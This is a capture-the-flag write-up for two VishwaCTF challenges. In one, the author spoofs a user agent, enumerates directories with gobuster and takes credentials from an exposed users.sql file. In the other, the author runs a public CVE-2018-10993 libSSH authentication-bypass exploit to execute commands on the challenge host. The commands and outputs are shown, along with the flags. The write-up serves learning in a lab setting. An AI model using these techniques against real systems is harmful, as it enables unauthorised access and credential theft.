## Task 1: Trip To Us
Question: IIT kharakpur is organizing a US Industrial Visit. The cost of the registration is $1000. But as always there is an opportunity for intelligent minds. Find the hidden login and Get the flag to get yourself a free US trip ticket.

Flag: `VishwaCTF{y0u_g0t_th3_7r1p_t0_u5}`

We are given a website of a US Industrial Visit form.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/fe2a1369-f2df-4d11-8349-917849810811)

However, pressing the `Click Here` button leads us to an error page. So I analyze the source code to find out how I can bypass this page.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/5889dfd8-2206-4a32-96b3-ed28437d0328)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HomePage</title>
    <style>
        .container {
            text-align: center;
            border: 2px solid black;
            margin-top: 10px;
            background-color: red;
            height: 100pt;

        }
        img{
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
    
                    <div class="container">
            <h1>YOU ARE NOT AN IITAIN , GO BACK!!!!!!!</h1>
            <img src="./Images/GoBack.webp" alt="Change User agent to 'IITIAN'">
            </div>       
                </div>
</body>
</html>
```

It mentions changing the user agent to `IITIAN`, so I went ahead and downloaded an [extension](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) that can change user agents on Firefox. With the user agent changed, we are able to access a new page.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/373de347-76f5-4619-bad0-eaccb48f0ffc)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/b1f78520-ffe7-4dcd-b932-a32dd8e7d5f1)

Reading the page source code again, there was nothing interesting that can help me obtain the flag. They did provide the username for the login so that will be used later.

```
<!DOCTYPE html>
<html>
<head>
	<title>LOGIN</title>
	<link rel="stylesheet" type="text/css" href="style.css">
	<style>
img{
    width: 100%;
    position: absolute;
    z-index: -1;
}
    </style>
</head>
<body>
	<img class= "bg" src="./Images/IIT.avif" alt="USE username as: admin">
	<h1>Welcome to IIT Kharakpur, US trip form</h1>
    <p style="font-size:20px;"><strong>Login to get your registration ID</strong></p>
    <form action="user-validation.php" method="post">
     	<h2>LOGIN</h2>
     	     	<label>User Name</label>
     	<input type="text" name="uname" placeholder="User Name"><br>

     	<label>User Name</label>
     	<input type="password" name="password" placeholder="Password"><br>

     	<button type="submit">Login</button>
    </form>
</body>
</html>
```

So I attempt to enumerate directories of the original website and found interesting results. It seems that there is database stored in the website.

```
└─$ gobuster dir --url ch66423157504.ch.eng.run -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ch66423157504.ch.eng.run
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Images               (Status: 301) [Size: 337] [--> http://ch66423157504.ch.eng.run/Images/]
/db                   (Status: 301) [Size: 333] [--> http://ch66423157504.ch.eng.run/db/]
/backups              (Status: 301) [Size: 338] [--> http://ch66423157504.ch.eng.run/backups/]
...
```

Checking out the database path, the `users.sql` database can be found which stores account credentials.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/a66fd027-9e90-431b-9f48-1f6ec4403b4f)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/ae9542bb-193d-40aa-ac09-c505b5f20bd1)

Use the credentials to login and get the flag.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/d0ec789c-8a89-42ee-a4fb-5ad74561635b)

## Task 2: Save The City
Question: The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!

Flag: `VishwaCTF{elrow-club-pune}`

We are given a netcat connection and using the command, we get a weird SSH version and it disconnects automatically after a few seconds. My teammate @Shen managed to find out what this meant.

```
└─$ nc 13.234.11.113 32657
SSH-2.0-libssh_0.8.1

Bye Bye                                                                                                                                                      
```

He mentioned that this was related to a CVE, specifically CVE-2018-10993. Using an [exploit](https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d) on GitHub, we can perform commands remotely via the exploit.

```
└─$ python cve-2018-10993.py 13.234.11.113 -p 32657 -c 'ls'

    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v0.1
    
bin
boot
dev
etc
home
lib
lib64
location.txt
media
mnt
opt
proc
root
run
sbin
srv
ssh_server_fork.patch
sys
tmp
usr
var
```

A suspicious text file can be found, the flag was in it.

```
└─$ python cve-2018-10993.py 13.234.11.113 -p 32657 -c 'cat location.txt'

    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v0.1
    
elrow-club-pune
```
